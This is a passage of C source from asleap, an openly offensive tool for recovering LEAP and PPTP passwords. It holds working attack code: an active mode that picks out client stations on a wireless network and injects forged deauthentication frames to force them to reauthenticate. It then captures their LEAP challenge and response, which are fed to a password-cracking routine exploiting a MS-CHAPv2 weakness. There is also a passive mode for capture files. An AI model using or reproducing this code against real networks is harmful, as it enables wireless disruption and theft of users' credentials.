           and response data, clear it and restart the process */
        asleap_reset(asleap_ptr);
        return 0;
    }
   
    if (leap_ptr->code != 3 && dot1x_ptr->type != 3)
        /*
         * leap code 3 == authentication successful
         * dot1x code 3 == EAPOL Key message 
         */
        return 0;
        
    /* Found the LEAP success frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured LEAP auth success:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump.  If we are not reading from a pcap
    source, we have already kludged h in getpacket to have the
    needed information. */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet); 
    }

    return 1;
}

void asleap_reset(struct asleap_data *asleap) {

    memset(asleap->username, 0, sizeof(asleap->username));
    memset(asleap->challenge, 0, sizeof(asleap->challenge));
    memset(asleap->response, 0, sizeof(asleap->response));
    memset(asleap->endofhash, 0, sizeof(asleap->endofhash));
    memset(asleap->password, 0, sizeof(asleap->password));
    memset(asleap->pptpauthchal, 0, sizeof(asleap->pptpauthchal));
    memset(asleap->pptppeerchal, 0, sizeof(asleap->pptppeerchal));
//    memset(asleap->pptpchal, 0, sizeof(asleap->pptpchal));
//    memset(asleap->pptppeerresp, 0, sizeof(asleap->pptppeerresp));
    asleap->leapchalfound = asleap->leaprespfound = 0;
    asleap->leapsuccessfound = 0;
    asleap->pptpchalfound = asleap->pptprespfound = 0;
    asleap->pptpsuccessfound = 0;
}



/* findcliententry accepts the MAC addresses of the STA and BSSID, and a
   pointer to the array of structs containing previously discovered stations.
   If the STA and BSSID have already been added to the struct, we return 1.
   Else, we return 0. */
int findstamac(u8 stamac[6], struct clientlist_data *clientlist) {

   int i, found=0;

   for(i=0; i < MAXCLIENTLIST; i++) {
       if (memcmp(clientlist[i].stamac, stamac, 6) == 0) {
           found=1;
           break;
       }

       /* If we have a member of clientlist that is NULL, we have reached 
          past the last added member of the struct.  We don't need to look any
          further. */
       // Fix this stupid nonsense
       if(memcmp(clientlist[i].stamac, "\0\0\0\0\0\0", 1) == 0)  {
            found=0;
            break;
       }
   }

   return(found);

}

/* addstamac() accepts the array of observed stations, the new station to add,
   and the current counter position in the array of stations.  addstamac() does
   not check to see if the entry has been added already, assumes findstamac()
   has been run to identify if this is a new station or not. 
   This function returns the new value of the current position in the clientlist
   array. */
int addstamac(struct clientlist_data *clientlist, u8 stamac[6], int clntcntr) {

    memcpy(clientlist[clntcntr].stamac, stamac, 6);
    clntcntr++;
    if (clntcntr > MAXCLIENTLIST) {
        /* Clear the stored array.  Everyone is a fresh target
           again.  This sucks, I know.  Laziness kills. */
        clntcntr=0;
        memset(clientlist, 0, sizeof(clientlist));
    }

    return(clntcntr);
}

/* Populate global packet[] with the next available packet */
int getpacket(struct capturedata_s capturedata) {

    struct timeval tv;
    int    n, pcapno, len;
    struct apeekl_rec_h apeeklprec;
    struct apeekx_rec_h apeekxprec;
    struct timeval ptstamp;
    fd_set rset;

    if (capturedata.captype) {
        switch(capturedata.captype) {
			case LPCAP_DLTTZSP_PCAP:
	        case LPCAP_DLTETH_PCAP:
            case LPCAP_DLTRFMON_PCAP: 
                if (!(packet = (u_char *)pcap_next(p, &h)) == 0) {
                    return(0);
                } else { 
                    return(1);
                }
                return(0);
                break;

            case APEEK_LEGACY_OFFLINE_PCAP: 

                /* Populate the Airopeek Packet Record for record length and
                   other information. */
                if (fread(&apeeklprec, sizeof(apeeklprec), 1,  
                    capturedata.apeekfp) < 1) {
                    /* Reached EOF on AiroPeek file */
                    return(1);
                }

                /* Change byte ordering for packet length */
                apeeklprec.length = ntohs(apeeklprec.length);
                apeeklprec.slice_length = ntohs(apeeklprec.slice_length);

                /* The value of slice_length overrides the reported length of
                 * the packet. */
                if (apeeklprec.slice_length) {
                    len = apeeklprec.slice_length;
                } else {
                    len = apeeklprec.length;
                }

                /* Round up packet length to even byte boundary */
                if (len % 2) 
                    len++;

                /* Check for corrupt data */
                if (len > MAX_80211_PACKET_LEN) {
                    fprintf(stderr, "Bad packet length: %d.\n", len);
                    return(-1);
                }

                /* The packet length reported by AiroPeek includes 4 preceding
                   bytes of 802.11 signal information, and a trailing 4 bytes
                   for the FCS.  We include the preceding 4 bytes in the per-
                   packet header, so read 4 fewer bytes here for just the raw
                   packet payload. */
                len = len - 4;

                /* free up the memory used for the previous packet */
                if (packet != NULL) {
                    free(packet);
                }

                /* Allocate len bytes for this packet */
                if ((packet = malloc(len)) == NULL) {
                    fprintf(stderr, "Unable to allocate %d bytes of memory.\n",
                        len);
                    perror("getpacket[malloc]");
                    return(-1);
                }

                /* Kludge up the pcap header to we can use pcap_dump to write
                 * out packets */
                h.caplen = h.len = len;
                gettimeofday(&ptstamp, NULL);
                h.ts.tv_sec = ptstamp.tv_sec;
                h.ts.tv_usec = ptstamp.tv_usec;

                if (fread(packet, len, 1, capturedata.apeekfp) < 1) {
                    return(1);
                } else {
                    return(0);
                }
                break;

            case APEEK_XML_OFFLINE_PCAP:
                /* Airopeek 2.x and later save file format */
                
                memset(&apeekxprec, 0, sizeof(apeekxprec));

                /* populate global packet[] */
                if (packet != NULL) {
                    free(packet);
                }

                /* Get the per-packet record header */
                if (fread(&apeekxprec, sizeof(apeekxprec), 1, 
                     capturedata.apeekfp) < 1) {
                    /* Reached EOF on AiroPeek file */
                    return(1);
                }

                /* The record header stores the record length in two fields.
                 * Use this to identify incorrect file handling or a corrupt
                 * file location. 
                 */
                if (apeekxprec.length1 != apeekxprec.length2) {
                    fprintf(stderr, "Mismatch in record length detected.\n");
                    return(-1);
                }

                if ((packet = malloc(apeekxprec.length1+1)) == NULL) {
                    fprintf(stderr, "Unable to allocate %d bytes of memory.\n",
                            apeekxprec.length1);
                    perror("getpacket[malloc]");
                    return(-1);
                }

                /* Kludge up the pcap header to we can use pcap_dump to write
                 * out packets 
                 */
                h.caplen = h.len = apeekxprec.length1;
                gettimeofday(&ptstamp, NULL);
                h.ts.tv_sec = ptstamp.tv_sec;
                h.ts.tv_usec = ptstamp.tv_usec;


                /* Populate packet[] with the payload information */
                if (fread(packet, apeekxprec.length1, 1, 
                     capturedata.apeekfp) < 1) {
                    return(1);
                } else {
                    return(0);
                }

                break;
                
            default:
                /* Shouldn't happen */
                fprintf(stderr, "Unknown error processing offline pcap "
                                "file.\n");
                return(-1);
        }

        /* Shouldn't get here */
        return(-1);

    } else { /* we are reading from a live interface. */

        /* select on the pcap fd, waiting for a packet */
        tv.tv_sec=0;
        tv.tv_usec=250000;
        pcapno = pcap_fileno(p); 
        FD_ZERO(&rset);
        FD_SET(pcapno, &rset);
        n = select(pcapno+1, &rset, NULL, NULL, &tv);
        /* select() will return > 0 if something interesting was found */
        if (n < 1) {
            /* Check for errors */
            if (errno == EAGAIN || errno == EINTR || errno == 0) {
                return(-2);
            }
        } else if (n == 0) {
            /* select() didn't find anything interesting.  Return. */
            return(-1);
        } else {
            /* select returned a ready filehandle */
            if (!(packet = (u_char *)pcap_next(p, &h)) == 0) {
                return(0);
            } else {
            /* pcap_next returned NULL */
                return(1);
            }
        }

        /* Never gets here */
        return(0);

    }

}
 

#ifdef _LINUX
int deauthsta(ajdata_t *ajdata, u8 *dest, u8 *bssid) {

    int    sock;
    int    len;

    struct ieee80211_mgmt frame;

    len = sizeof(frame);

    if((sock = aj_getsocket(ajdata->ifname)) < 0) {
        perror("aj_getsocket");
        close(sock);
        return(-1);
    }

    /* setup the frame */
    memset(&frame, 0, len);
    frame.frame_control =
        ((WLAN_FC_TYPE_MGMT << 2) | (WLAN_FC_STYPE_DEAUTH << 4));
    memcpy(frame.da, dest, sizeof(frame.da));
    memcpy(frame.sa, bssid, sizeof(frame.sa));
    memcpy(frame.bssid, bssid, sizeof(frame.bssid));
    frame.u.deauth.reason_code = 2;

    //printf("Attempting to send deauthenticate frame.\n");
    //lamont_hdump((u8 *)&frame, len);
    //printf("\n");

    if ((write(sock, &frame, len) < len)) {
        perror("write");
        close(sock);
        return(-1);
    }

    close(sock);
    return(0);
}


/* nextchannel accepts the current channel as input, and returns the new
   channel.  nextchannel returns -1 on error. */
int nextchannel(ajdata_t *ajdata, int currentchannel) {

    int newchannel = 0;
    newchannel = ((currentchannel % MAXCHANNEL) + 1);

    if (aj_setchannel(ajdata->ifname, newchannel) != 0) {
        return(-1);
    } else {
        return(newchannel);
    }

}
#endif

char *getdevice(char *optarg) {

	pcap_if_t	*devpointer;
    int         devnum=0, i=0;

    if ((devnum = atoi(optarg)) != 0) {
        if (devnum < 0) {
            fprintf(stderr, "Invalid adapter index.\n");
            return NULL;
        }

        if (pcap_findalldevs(&devpointer, errbuf) < 0) {
            fprintf(stderr, "%s\n", errbuf);
            return NULL;
        } else {
            for (i=0; i < devnum-1; i++) {
                devpointer = devpointer->next;
                if (devpointer == NULL) {
                    fprintf(stderr, "Invalid adapter index.\n");
                    return NULL;
                }
            }
        }
    }

    return(devpointer->name);
}

/* List all the available interfaces, adapted from WinDump code */
int listdevs() {

	pcap_if_t	*devpointer;
	int			i;

	if (pcap_findalldevs(&devpointer, errbuf) < 0) {
		fprintf(stderr, "%s", errbuf);
	    return(-1);
	} else {
		printf("Device listing:\n");
		for (i = 0; devpointer != 0; i++) {
			printf("%d. %s", i+1, devpointer->name);
			if (devpointer->description != NULL)
				printf(" (%s)", devpointer->description);
			printf("\n");
			devpointer = devpointer->next;
		}
        return(0);
	}
}


int populate_offset(struct capturedata_s *capturedata) {

/* Set the offset depending on the link type.  This allows us to accommodate
 * capture files in RFMON mode or Ethernet mode. 
 * We can't rely on the Libpcap DLT numbers to differentiate supported pcap
 * types, since we support AiroPeek files as well as pcap files.  Instead, 
 * we use the captype variable, which is populated in main() for offline packet
 * captures.  If we are capturing online, we know it is with libpcap and 
 * therefore can rely on the standard DLT types.
 */
    if (capturedata->livecapture == 0) {
        /* offline packet capture, rely on capturedata->captype to
           differentiate */
        switch (capturedata->captype) {
        	case LPCAP_DLTTZSP_PCAP:
            /* XXX Chris Waters says the TZSP header format is not a consistent
               length.  This method has worked for my tests; if you have a TZSP
               capture that does not work, send it to me and I'll fix the code
               appropriately. jwright@hasborg.com */
        		capturedata->dot11offset= TZSP_DOT11_OFFSET;
        		capturedata->dot1xoffset = TZSP_DOT1X_OFFSET;
        		capturedata->leapoffset = TZSP_LEAP_OFFSET;
                capturedata->iphdroffset = TZSP_IP_OFFSET;
        		break;
            case LPCAP_DLTNULL_PCAP:
        	case LPCAP_DLTETH_PCAP:
        	    /* We don't get the 802.11 headers here, so we make due without
        	     */
        	    capturedata->dot1xoffset = EN10MBLINK_DOT1X_OFFSET;
        	    capturedata->leapoffset = EN10MBLINK_LEAP_OFFSET;
                capturedata->iphdroffset = EN10MBLINK_IP_OFFSET;
        	    break;
        	case LPCAP_DLTRFMON_PCAP:
        	case APEEK_LEGACY_OFFLINE_PCAP:
        	case APEEK_XML_OFFLINE_PCAP:
        	    capturedata->dot11offset = DOT11LINK_DOT11_OFFSET;
        	    capturedata->dot1xoffset = DOT11LINK_DOT1X_OFFSET;
        	    capturedata->leapoffset = DOT11LINK_LEAP_OFFSET;
                capturedata->iphdroffset = DOT11LINK_IP_OFFSET;
        	    break;
        	default:
                /* Unsupported capture file */
                return(-1);
        	    break; 
        }
    } else if (capturedata->livecapture == 1) {
        switch (capturedata->pcaptype) {
            case DLT_EN10MB:
            case DLT_NULL:
        	    capturedata->dot1xoffset = EN10MBLINK_DOT1X_OFFSET;
        	    capturedata->leapoffset = EN10MBLINK_LEAP_OFFSET;
                capturedata->iphdroffset = EN10MBLINK_IP_OFFSET;
                break;
            case DLT_IEEE802_11:
        	    capturedata->dot11offset = DOT11LINK_DOT11_OFFSET;
        	    capturedata->dot1xoffset = DOT11LINK_DOT1X_OFFSET;
        	    capturedata->leapoffset = DOT11LINK_LEAP_OFFSET;
                capturedata->iphdroffset = DOT11LINK_IP_OFFSET;
                break;
            case DLT_TZSP:
        		capturedata->dot11offset= TZSP_DOT11_OFFSET;
        		capturedata->dot1xoffset = TZSP_DOT1X_OFFSET;
        		capturedata->leapoffset = TZSP_LEAP_OFFSET;
                capturedata->iphdroffset = TZSP_IP_OFFSET;
                break;
            default:
                /* Unsupported live capture interface */
                return(-2);
                break;
            }
    }

    return(0);
}


int main(int argc, char *argv[]) {

    int    c, opt_verbose=0, activeattack=0, pcapfile=0;
    char   *device, dictfile[255], dictidx[255], offline_pcap[255];
    struct asleap_data asleap;
    struct stat dictstat, capturedatastat;
    struct clientlist_data clientlist[MAXCLIENTLIST];
    struct capturedata_s capturedata;
    struct apeekl_master_h masterh;
    struct apeekl_secondary_h secondh;
    struct apeekx_pkts_h apeekpktsh;
    int    channel=0, channelhop=0, findleaptimeout=5, poffset;
    int    findlpexchret=0;

#ifdef _LINUX
    int    n, clntcntr=0, epochstart=0, elapsed=0;
    struct ieee80211 *dot11_ptr;
    struct timeval then, now;
#endif

    memset(clientlist, 0, sizeof(clientlist));
    memset(dictfile, 0, sizeof(dictfile));
    memset(dictidx, 0, sizeof(dictidx));
    memset(offline_pcap, 0, sizeof(offline_pcap));
    memset(&wpcap, 0, sizeof(wpcap));
    memset(&asleap, 0, sizeof(asleap));
    memset(&ajdata, 0, sizeof(ajdata));
    memset(&capturedata, 0, sizeof(capturedata));
    memset(&apeekpktsh, 0, sizeof(apeekpktsh));
    memset(&h, 0, sizeof(h));
    memset(&wpcap, 0, sizeof(wpcap));
    device = NULL;

    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);
    signal(SIGQUIT, cleanup);


    printf("asleap %s - actively recover LEAP/PPTP passwords. "
           "<jwright@hasborg.com>\n", VER);

    while ((c = getopt(argc, argv, "DsoavhVi:f:n:r:w:c:t:W:")) != EOF) {
        switch(c) {
			case 's':
				asleap.skipeapsuccess = 1;
				break;
            case 'i':
                capturedata.livecapture=1;
                if (atoi(optarg) == 0) {
                    device = optarg;
                } else {
				    device = getdevice(optarg);
                    if (device == NULL) {
                        usage("Error processing device name, try -D");
                        exit(1);
                    }
                }
                break;
            case 'f':
                strncpy(dictfile, optarg, sizeof(dictfile)-1);
                break;
            case 'n':
                strncpy(dictidx, optarg, sizeof(dictidx)-1);
                break;
            case 'w':
                strncpy(wpcap.wfilename, optarg, sizeof(wpcap.wfilename)-1);
                break;
            case 'h':
                usage("");
                exit(0);
                break;
            case 'r':
                strncpy(capturedata.filename, optarg, 
                    sizeof(capturedata.filename)-1);
                activeattack=0;
                capturedata.livecapture=0;
                pcapfile=1;
                break;
            case 'v':
                opt_verbose += 1;
                break;
            case 'a':
                activeattack=1;
                break;
            case 'o':
                channelhop=1;  
                break;
            case 'c':
                channel = atoi(optarg);
                break;
            case 't':
                findleaptimeout = atoi(optarg);
                break;
            case 'V':
                printf("Version $Id: asleap.c,v 1.27 2004/11/29 19:56:33 jwright Exp $\n");
                exit(0);
                break;
			case 'D':
				/* list available devices */
				listdevs();
				exit(0);
				break;
            case 'W':
                strncpy(asleap.wordfile, optarg, sizeof(asleap.wordfile)-1);
                break;
            default:
                usage("");
                exit(1);
        }
    }

    /* Populate the asleap struct with the gathered information */
    asleap.verbose = opt_verbose;
    strncpy(asleap.dictfile, dictfile, sizeof(asleap.dictfile)-1);
    strncpy(asleap.dictidx, dictidx, sizeof(asleap.dictidx)-1);

    if (IsBlank(device) && IsBlank(capturedata.filename) && 
        IsBlank(asleap.wordfile)) {
        usage("Must supply an interface with -i, or a stored file with -r");
        exit(1);
    }

    if (!IsBlank(asleap.wordfile)) {
        if (*asleap.wordfile == '-') {
            printf("Using STDIN for words.\n");
        } else {
            printf("Using wordlist mode with \"%s\".\n", asleap.wordfile);
        }
    }

    /* Populate the ajdata struct with gathered information */
    if (!IsBlank(device) && pcapfile != 1) {
        strncpy(ajdata.ifname, device, sizeof(ajdata.ifname));
    }

#ifdef _LINUX
    if (channel && channelhop) {
        usage("Cannot specify -o and -c");
        exit(1);
    }
#endif

    if (activeattack && (!IsBlank(capturedata.filename)) ) {
        /* Can't be an active attack and use a stored pcap file.  Duh. */
        usage("Cannot use -a and -r");
        exit(1);
    }

    if (!IsBlank(asleap.dictfile)) {
        if (stat(asleap.dictfile, &dictstat)) {
            /* Could not stat the dictionary file.  Bail. */
            usage("Could not stat the dictionary file.");
            exit(1);
        }
    }
    

    /* If the user passed the -r flag, open the filename as a captured pcap
       file,  this can be a libpcap file, or a AiroPeek NX file.  
       Otherwise open live from the supplied device name */
    if (!IsBlank(capturedata.filename)) {

        /* Make sure the the file exists */
        if (stat(capturedata.filename, &capturedatastat) != 0) {
            usage("Could not stat the pcap file.");
            exit(1);
        }
        
        /* Determine the capture file type */
        capturedata.captype = test_filetype(capturedata.filename);
    	if (capturedata.captype < 0) {
            fprintf(stderr, "Unsupported packet capture or interface type: "
                    "%d.\n",
                capturedata.captype);
    			exit(1);
        }

        switch(capturedata.captype) {
        case APEEK_XML_OFFLINE_PCAP:
            /* Version 2.X of AiroPeek capture file. */ 
            if ((capturedata.apeekfp = fopen(capturedata.filename, "rb")) 
                  == NULL) {
                fprintf(stderr, "Cannot open file %s.\n", capturedata.filename);
                perror("Unable to open capture file");
                cleanup();
            }

            if (find_pktsdelim(capturedata.apeekfp) != 0) {
                fprintf(stderr, "Unable to identify offset for packet "
                        "payload.\n");
                cleanup();
            }

            if (fread(&apeekpktsh, sizeof(apeekpktsh), 1, 
                capturedata.apeekfp) < 1) {
                perror("Unable to read from capture file");
                cleanup();
            }
            break;

        case APEEK_LEGACY_OFFLINE_PCAP:
            /* Airopeek pre v2.X capture file */
            if ((capturedata.apeekfp = fopen(capturedata.filename, "rb")) 
                == NULL) {
                perror("Unable to open capture file");
                cleanup();
            }

            /* Read past the initial header information of the file */
            fread(&masterh, sizeof(masterh), 1, capturedata.apeekfp);
            fread(&secondh, sizeof(secondh), 1, capturedata.apeekfp);
            break;

        case LPCAP_DLTTZSP_PCAP:
	    case LPCAP_DLTETH_PCAP:
        case LPCAP_DLTNULL_PCAP:
        case LPCAP_DLTRFMON_PCAP:
            /* Libpcap file */
            p = pcap_open_offline(capturedata.filename, errbuf);
            if (p == NULL) {
                perror("Unable to open capture file");
                exit(-1);
            }
            break;

        }

    } else { /* Reading from interface in live capture mode */

        p = pcap_open_live(device, SNAPLEN, PROMISC, TIMEOUT, errbuf);
        if (p == NULL) {
            perror("Unable to open live interface");
            exit(-1);
        }
        capturedata.pcaptype = pcap_datalink(p);

        switch(capturedata.pcaptype) {
            case DLT_NULL:
            case DLT_EN10MB:
                capturedata.captype = LPCAP_DLTETH_PCAP;
                break;
            case DLT_IEEE802_11:
                capturedata.captype = LPCAP_DLTRFMON_PCAP;
                break;
            case DLT_TZSP:
                capturedata.captype = LPCAP_DLTTZSP_PCAP;
                break;
            default:
                fprintf(stderr, "Unsupported pcap data link type: %s (%d), "
                        "%s.\n",
                        pcap_datalink_val_to_name(capturedata.pcaptype),
                        capturedata.pcaptype,
                        pcap_datalink_val_to_description(capturedata.pcaptype));
                cleanup(); /* Exits */
        }

    }


    /* If the user passed -w filename, open a pcap handle to write discovered
       LEAP exchanges.  This works really well when we are reading from a
       pcap source (live interface or a libpcap capture file), but we have to 
       kludge a little bit if we are reading from an Airopeek stored file. */
    if (!IsBlank(wpcap.wfilename)) {
        if (p == NULL) {
            /* Fill the initial pcap header with information from
             * pcap_open_dead.
             */
            p = pcap_open_dead(DLT_IEEE802_11, 65535);
        }

        wpcap.wp = pcap_dump_open(p, wpcap.wfilename);
        if (wpcap.wp == NULL) {
            perror("pcap_dump_open");
            memset(&wpcap, 0, sizeof(wpcap));
        }
    }


    /* If the interface passed to us is not "^aj", we use passive mode. */
    if (activeattack && (strncmp(device, "aj", 2))) {
        fprintf(stderr, "Interface %s does not appear to be a ", device);
        fprintf(stderr, "AirJack interface.\n");
        activeattack=0;
    } 

    if (activeattack) {

#ifndef _LINUX
        fprintf(stderr, "Active attack is only available on Linux.\n");
        cleanup();
        exit(0);
#else
        printf("Using the active attack method.\n");

        /* Set our channel */
        if (channel && !channelhop) {
           if (channel < 1 || channel > MAXCHANNEL) {
               usage("Bad channel selection");
               cleanup();
           } else {
               if (aj_setchannel(ajdata.ifname, channel)) {
                   perror("aj_setchannel");
                   cleanup();
               }
           }
        }

        /* Set our SSID */
        if (aj_setessid(ajdata.ifname, "asleap", 6)) {
            perror("aj_setessid");
        }

        /* Set out MAC */
        if (aj_setmac(ajdata.ifname, "\x00\x40\x96\x00\x00\x00")) {
            perror("aj_setmac");
        }


        /* Make sure mode is appropriate for injecting packets */
        if (aj_setmode(ajdata.ifname, 5)) { 
            perror("aj_setmode");
            cleanup();
        }

        if (aj_setmonitor(ajdata.ifname, 1)) {
            perror("aj_setmonitor");
            cleanup();
        }


        /* Go non-blocking.  This is only necessary if we are channel hopping */
           if (aj_setnonblock(ajdata.ifname, 1)) {
            fprintf(stderr, "Error setting nonblock mode.\n");
            perror("aj_setnonblock");
            exit(-1);
        } 
#endif


    } else {
    
        printf("Using the passive attack method.\n");

    }

    /* Populate the capturedata struct with the offset information for the
     * various capture types so we can consistently identify the start of
     * 802.11, 802.1x and LEAP headers. */
    poffset = populate_offset(&capturedata);
    if (poffset != 0) {
        fprintf(stderr, "Unsupported capture file link type: %d.\n", poffset);
        cleanup();
        exit(1);
    }

/*
 * Our attack method is to collect frames until we get an EAP-Challenge packet.
 * From the EAP-Challenge packet we collect the 8-byte challenge, then wait for
 * the EAP-Response to collect the response information.  With the challenge
 * and response, we start the grinder to abuse weaknesses in MS-CHAPv2 to
 * recover weak passwords.  The username information is sent in the clear in
 * both challenge and response traffic.  Take a look at asleap.h for packet
 * definition information.
 */


    while(1) {

        if(activeattack) {

#ifndef _LINUX
        fprintf(stderr, "Active attack is only available on Linux.\n");
        cleanup();
	exit(0);
#else
            /* Start an infinite loop until user presses CTRL/C, or if
               findlpexch() returns 0 -- break. */
            gettimeofday(&then, NULL);
            epochstart = ((then.tv_sec * 1000000) + then.tv_usec);

            while(1) {

                if (channelhop) {
                    /* Change the channel every CHANHOPTIME usec */
                    gettimeofday(&now, NULL);
                    elapsed =
                       (((now.tv_sec * 1000000) + now.tv_usec) - epochstart);
                    if (elapsed > CHANHOPTIME) {
                        channel = nextchannel(&ajdata, channel);
                        if (channel == -1) {
                            perror("nextchannel");
                            cleanup();
                        }

                        if (asleap.verbose > 0) 
                            printf("Changing channel to %d.\n", channel);

                        /* Update epochstart with current time */
                        gettimeofday(&then, NULL);
                        epochstart = ((then.tv_sec * 1000000) + then.tv_usec);
                    }
                }
    
                /* Start collecting packets, looking for any data frames */
                n = getpacket(capturedata);
                if (n < 0) {
                    continue;
                } else if (n == 1) {
                    if (asleap.verbose) 
                        printf("Reached EOF on pcapfile.\n");
                        cleanup();
                }

                dot11_ptr = (struct ieee80211 *)&packet[0];
    
                /* We want to find data frames, indicating a client on the
                   network.  Specifically, we are looking for TODS frames, that
                   are of type data.  This eliminates traffic from the AP,
                   since traffic from the AP would be FROMDS. We also want to
                   make sure we haven't seen this traffic yet, so we check for
                   the STA MAC with the findstamac() function. */
                if (dot11_ptr->type != 2  || dot11_ptr->subtype != 0)
                   continue;

                if(asleap.verbose) {
                    printf("Recvd a data frame: ");
                    printf("len %d tods %d fromds %d src %s dst %s\n", 
                        h.len, dot11_ptr->to_ds, dot11_ptr->from_ds,
                        printmac(dot11_ptr->addr2), printmac(dot11_ptr->addr1));
                }

                if (asleap.verbose > 2) {
                    lamont_hdump(packet, h.len);
                    printf("\n");
                }


                /* Test this packet to make sure it is a data frame, TODS, not
                   FROMDS, and hasn't already been discovered in our list of
                   victims. */
                if(dot11_ptr->type == 2 && dot11_ptr->subtype == 0 &&
                   dot11_ptr->to_ds && !(dot11_ptr->from_ds) &&
                   (!findstamac(dot11_ptr->addr2, clientlist))) {

                   printf("Found some fresh meat: ");
                   printf("%02x%02x%02x%02x%02x%02x\n",
                       dot11_ptr->addr2[0], dot11_ptr->addr2[1],
                       dot11_ptr->addr2[2], dot11_ptr->addr2[3],
                       dot11_ptr->addr2[4], dot11_ptr->addr2[5]);


                    /* Add the new SRC MAC to the clientlist, update the value
                       of clntcntr to reflect the position in the array of STA
                       addresses. */
                    clntcntr=addstamac(clientlist, dot11_ptr->addr2, clntcntr);
    
                    if (asleap.verbose) { 
                        printf("Sending deauth to %02x%02x%02x%02x%02x%02x ",
                            dot11_ptr->addr2[0], dot11_ptr->addr2[1],
                            dot11_ptr->addr2[2], dot11_ptr->addr2[3],
                            dot11_ptr->addr2[4], dot11_ptr->addr2[5]);
                        printf("from, %02x%02x%02x%02x%02x%02x\n",
                            dot11_ptr->addr1[0], dot11_ptr->addr1[1],
                            dot11_ptr->addr1[2], dot11_ptr->addr1[3],
                            dot11_ptr->addr1[4], dot11_ptr->addr1[5]);
                        lamont_hdump(packet, h.len);
                        printf("\n");
                    }

                    /* Disable monitor mode before injecting the packet */
                    if (aj_setmonitor(ajdata.ifname, 0) != 0) {
                        perror("aj_setmonitor");
                        cleanup();
                    }

                    /* Abaddon recommendation between switching modes */
                    usleep(250000);

                    /* deauth the station to force them to reauthenticate */
                    if (deauthsta(&ajdata, dot11_ptr->addr2, 
                        dot11_ptr->addr1)) { 
                        
                        printf("Error sending deauth.  Continuing.\n");
                    }

                    /* Change back into RFMON */
                    if (aj_setmonitor(ajdata.ifname, 1) != 0) {
                        perror("aj_setmonitor");
                        cleanup();
                    }

                    if (!(findlpexch(&asleap, findleaptimeout, wpcap,
                          capturedata))) {
                        printf("\nCaptured LEAP exchange information:\n");
                        print_leapexch(&asleap);
                        break; 
                    } else {
                        printf("Timeout exceeded while watching for "
                               "LEAP traffic.\n");
                        continue;
                    }
    
                } else {
    
                    /* We want another packet.  The last one sucked. */
                    continue;
    
                }
    
            }  /* End while(1) loop */

#endif
    
        } else { /*  do a passive attack */
    
            while(1) {
    
                findlpexchret = findlpexch(&asleap, 0, wpcap, capturedata);

                if (findlpexchret == LEAPEXCHFOUND) {
                    printf("\nCaptured LEAP exchange information:\n");
                    print_leapexch(&asleap);
                    break;
                } 

                if (findlpexchret == PPTPEXCHFOUND) {
                    printf("\nCaptured PPTP exchange information:\n");
                    print_pptpexch(&asleap);
                    break;
                }

                /* Not necessary to rest for a timeout, since we just keep
                   cycling through the loop until EOF on pcap file anyway */
            }
                
        } /* End if(activeattack) loop */
    
        /* Now that we have the challenge and response information, the
           real fun begins.  With the hash and response, we can use the
           weakness in caculating the third DES key used to generate the
           response text since this is only 2^16 possible combinations. */
        if (asleap.leapchalfound && asleap.leaprespfound) {
            attack_leap(&asleap);
            asleap_reset(&asleap);
        }

        if (asleap.pptpchalfound && asleap.pptprespfound) {
            attack_pptp(&asleap);
            asleap_reset(&asleap);
        }
       
    
    } /* End initial while(1) loop */

    exit(0);

} /* End main() */

